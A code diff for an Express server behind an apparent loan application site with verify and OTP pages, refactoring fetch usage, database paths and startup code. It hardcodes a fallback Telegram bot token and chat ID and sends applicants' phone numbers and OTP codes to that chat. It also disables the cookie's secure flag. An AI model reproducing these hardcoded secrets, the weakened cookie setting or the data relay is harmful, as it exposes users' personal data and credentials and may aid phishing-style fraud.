@@ -5,10 +5,12 @@ const helmet = require('helmet');
 const morgan = require('morgan');
 const rateLimit = require('express-rate-limit');
 const path = require('path');
-const fetch = require('node-fetch');
 const sqlite3 = require('sqlite3').verbose();
 const { open } = require('sqlite');
 require('dotenv').config();
+
+// Use native fetch (Node.js 18+ has built-in fetch)
+// No need for node-fetch package!
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -21,10 +23,10 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8743116479:AAH4UIB
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8392790531';
 const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
-// Database path - Railway uses /tmp for ephemeral storage
-const DB_PATH = process.env.NODE_ENV === 'production' ? '/tmp/loans.db' : './database/loans.db';
+// Database path
+const DB_PATH = '/tmp/loans.db';
 
-let db;
+let db = null;
 
 async function initDatabase() {
     try {
@@ -87,7 +89,7 @@ app.use(session({
     resave: false,
     saveUninitialized: false,
     cookie: {
-        secure: process.env.NODE_ENV === 'production',
+        secure: false, // Set to false for Railway HTTP
         httpOnly: true,
         maxAge: 30 * 60 * 1000
     }
@@ -108,7 +110,7 @@ function generateLoanId() {
     return `MUG${timestamp}${random}`.toUpperCase();
 }
 
-// Send message to Telegram
+// Send message to Telegram using native fetch
 async function sendTelegramMessage(text, replyMarkup = null) {
     try {
         const payload = {
@@ -157,12 +159,11 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Serve verify.html
+// Serve HTML pages
 app.get('/verify.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'verify.html'));
 });
 
-// Serve otp.html
 app.get('/otp.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'otp.html'));
 });
@@ -354,8 +355,7 @@ app.post('/webhook/telegram', async (req, res) => {
                     `<b>📱 Phone:</b> <code>${loan.phone}</code>\n` +
                     `━━━━━━━━━━━━━━━━━━\n\n` +
                     `<b>🔐 Your OTP Code:</b> <code>${otp}</code>\n\n` +
-                    `<i>Enter this code on the OTP verification page to complete your loan.</i>\n\n` +
-                    `<b>🔗 Verification Link:</b>\n${RAILWAY_URL}/otp.html`;
+                    `<i>Enter this code on the OTP verification page to complete your loan.</i>`;
                 
                 await sendTelegramMessage(messageText);
                 
@@ -393,7 +393,7 @@ app.post('/webhook/telegram', async (req, res) => {
     }
 });
 
-// 404 handler for unknown routes
+// 404 handler
 app.use('*', (req, res) => {
     res.status(404).json({ error: 'Route not found' });
 });
@@ -406,25 +406,13 @@ app.use((err, req, res, next) => {
 
 // Start server
 async function startServer() {
-    const dbInitialized = await initDatabase();
-    
-    if (!dbInitialized) {
-        console.error('⚠️ Failed to initialize database, but server will continue');
-    }
+    await initDatabase();
     
     app.listen(PORT, '0.0.0.0', () => {
         console.log(`🚀 Server running on port ${PORT}`);
-        console.log(`🌐 URL: ${RAILWAY_URL}`);
-        console.log(`✅ Health check: ${RAILWAY_URL}/health`);
+        console.log(`✅ Health check: /health`);
         console.log(`📱 Telegram Bot configured`);
     });
 }
-
-// Handle shutdown gracefully
-process.on('SIGINT', async () => {
-    console.log('Shutting down...');
-    if (db) await db.close();
-    process.exit(0);
-});
 
 startServer();
